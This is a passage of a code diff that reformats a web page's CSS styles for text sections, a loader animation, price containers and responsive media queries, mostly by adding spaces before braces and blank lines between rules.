-.text-5{
+.text-5 {
   padding-top: 1%;
   padding-bottom: 1%;
   font-size: 1.2rem;
@@ -849,33 +887,37 @@ hr.new1 {
   font-weight: bold;
 }
 
-.text-6{
+.text-6 {
   padding-top: 1%;
   padding-bottom: 1%;
 }
 
-.text-7{
+.text-7 {
   padding-top: 0.5%;
   padding-bottom: 0.5%;
 }
 
-.text-8{
+.text-8 {
   padding-top: 1%;
   padding-bottom: 1%;
 }
-span{
+
+span {
   font-family: 'BR-Firma-Bold', sans-serif;
   font-weight: bold;
 }
-.premium{
+
+.premium {
   color: #007bff;
   font-family: 'BR-Firma-Regular', sans-serif;
   font-weight: lighter;
 }
-.lawrence{
+
+.lawrence {
   display: flex;
 }
-.sep{
+
+.sep {
   font-size: 20px;
   padding-right: 5px;
   font-weight: bold;
@@ -889,6 +931,7 @@ span{
   background: rgba(255, 255, 255, 0.15);
   overflow: hidden;
 }
+
 .loader::after {
   content: '';
   width: 192px;
@@ -912,7 +955,7 @@ span{
   }
 }
 
-.seprate{
+.seprate {
   display: flex;
   align-items: center;
   align-content: center;
@@ -920,18 +963,18 @@ span{
   margin-bottom: 10px;
 }
 
-.action-text-part{
+.action-text-part {
   background-color: #007bff;
   padding: 20px;
   margin-top: 20px;
 }
 
-.action-text-part-text-1{
+.action-text-part-text-1 {
   color: #FFFFFF;
   padding-bottom: 15px;
 }
 
-.price-container{
+.price-container {
   display: flex;
   justify-content: space-between;
   align-items: center;
@@ -939,20 +982,20 @@ span{
   margin-top: 20px;
 }
 
-.price-container-1{
+.price-container-1 {
   display: flex;
   align-items: center;
   align-content: center;
   gap: 5px;
 }
 
-.price-container-text-1{
+.price-container-text-1 {
   font-weight: bold;
   font-family: 'BR-Firma-Bold', sans-serif;
   font-size: 22px;
 }
 
-.price-container-text-2{
+.price-container-text-2 {
   color: #FFFFFF;
   background-color: #007bff;
   height: 32px;
@@ -961,7 +1004,7 @@ span{
   border-radius: 5px;
 }
 
-.price-container-text-3{
+.price-container-text-3 {
   color: green;
   background-color: transparent;
   border: 1px solid green;
@@ -972,13 +1015,13 @@ span{
   cursor: pointer;
 }
 
-.price-container-text-3:hover{
+.price-container-text-3:hover {
   color: #ffffff;
   background-color: green;
   border: 1px solid green;
 }
 
-.info-container{
+.info-container {
   margin-top: 20px;
 }
 
@@ -987,7 +1030,7 @@ span{
   height: 10px;
   border-radius: 50%;
   display: block;
-  margin:5px auto;
+  margin: 5px auto;
   position: relative;
   color: #007bff;
   left: -200px;
@@ -1026,19 +1069,19 @@ span{
 }
 
 @media (max-width: 990px) {
-  .section-1{
+  .section-1 {
     width: 85%;
     margin-left: auto;
     margin-right: auto;
   }
 }
 
-@media (max-width: 700px){
-  .loader-text{
+@media (max-width: 700px) {
+  .loader-text {
     font-size: 13px;
   }
 }
 
-@media (max-width: 500px){
+@media (max-width: 500px) {
 }
 </style>
